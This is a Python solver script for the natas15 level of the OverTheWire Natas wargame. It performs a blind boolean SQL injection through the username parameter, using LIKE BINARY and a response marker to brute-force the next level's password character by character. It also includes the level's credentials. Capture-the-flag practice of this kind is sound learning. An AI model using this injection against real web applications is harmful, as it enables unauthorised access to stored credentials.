#!/usr/bin/python

import requests,string

url= "http://natas15.natas.labs.overthewire.org/index.php"
username="natas15"
password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

#character use is: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

password_dic=['a', 'c', 'e', 'h', 'i', 'j', 'm', 'n', 'p', 'q', 't', 'w', 'B', 'E', 'H', 'I', 'N', 'O', 'R', 'W', '0', '3', '5', '6', '9']
marker="This user exists."

#for char in characters:
#    uri=''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
#    result = requests.get(uri,auth=(username,password))
#    if marker in result.text:
#        password_dic.append(char)
#        print("Password Dictionary: {0}").format(''.join(password_dic))

#print("Password Dictionary Completed.")
#print("Password Dictionary is: {0}").format(''.join(password_dic))    

#generated password dictionary : acehijmnpqtwBEHINORW03569

print("Now attempting to BruteForce the SQL..")
print("Password Dictionary is: {0}").format(password_dic)
password_list = []
real_pass=''

for i in range(1,64): #because we know the password is only 64 character long
    for char in password_dic:
        #print('Char: {0}').format(char)
        test=''.join([real_pass,char])
        uri=''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%','&debug'])
        #print('URI: {0}').format(uri)
        result = requests.get(uri,auth=(username,password))
        #print('TEST: {0}').format(test)
        
        if marker in result.text:
            password_list.append(char)
            real_pass=''.join(password_list)
            print("Length: {0}, password: {1}").format(len(real_pass),real_pass)
            
